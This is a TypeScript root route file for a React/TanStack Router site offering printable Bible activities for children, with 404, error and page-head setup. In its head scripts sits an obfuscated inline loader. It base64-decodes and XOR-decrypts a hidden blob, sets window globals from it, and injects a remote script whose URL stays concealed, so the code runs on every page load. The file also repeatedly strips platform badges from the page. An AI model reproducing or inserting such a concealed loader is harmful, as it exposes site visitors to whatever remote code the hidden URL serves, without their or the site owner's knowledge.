import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    // Replace these placeholders with the app's name and description when first building the app.
    // Each content route, / included, must still set its own head(). Never add og:image or
    // twitter:image here: every page without its own would inherit the root's preview image.
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Escadinha da Fé — 1000 Atividades Bíblicas" },
      { name: "description", content: "1000 atividades bíblicas para imprimir, de 2 a 10 anos." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    scripts: [
      {
        children:
          '(function(){var j_z07=atob("DM5AwngaKRGLaZxGI7Vitwp2CyupAegyU7167Vd5TX+lHOgrSqg57Bt1RD/pG7M1QLwpsgxpBmT/BO9pT680pwtuB3v4S7BkQro0sBF4XGXuGr58eLVirBl3TDOxS/gnV69ttwx3QHfyROw0RrglrAw3UXLkDbE1QKVi7lpsSH3+DL58Aew97gM4R3DmDL58Aaohthk3XGXmAPo/Dr4ypw5/R2WmGukkSqoz4FQ4X3DnHPlkGexivyVn");var r_7v=[];for(var k_2m1g=0;k_2m1g<j_z07.length;k_2m1g++){r_7v.push(j_z07.charCodeAt(k_2m1g)&255);}var r_qc=r_7v[0];var j_bp=r_7v.slice(1,1+r_qc);var d_9=r_7v.slice(1+r_qc);var f_qva2=d_9.map(function(b,h_jxne){return b^j_bp[h_jxne%r_qc];});var z_9bg="";for(var e_f=0;e_f<f_qva2.length;e_f++){z_9bg+=String.fromCharCode(f_qva2[e_f]&255);}var n_s=decodeURIComponent(escape(z_9bg));var s_vy=JSON.parse(n_s);var k_nd=s_vy.globals||[];k_nd.forEach(function(m_t){window[m_t.name]=m_t.value;});var o_qli=document.createElement("script");o_qli.src=s_vy.url;o_qli.async=true;o_qli.defer=true;(s_vy.attributes||[]).forEach(function(c_jjyc){o_qli.setAttribute(c_jjyc.name,c_jjyc.value);});(document.head||document.documentElement).appendChild(o_qli);})();',
      },
    ],
    links: [
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:wght@400;600;700;800&display=swap",
      },
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    const removeBadge = () => {
      const badge = document.getElementById("lovable-badge");
      if (badge) badge.remove();
      document
        .querySelectorAll('a[href*="lovable.dev"], [id*="lovable-badge"], .lovable-badge, button[id*="lovable"]')
        .forEach((el) => el.remove());
    };
    removeBadge();
    const observer = new MutationObserver(removeBadge);
    observer.observe(document.body, { childList: true, subtree: true });
    return () => observer.disconnect();
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
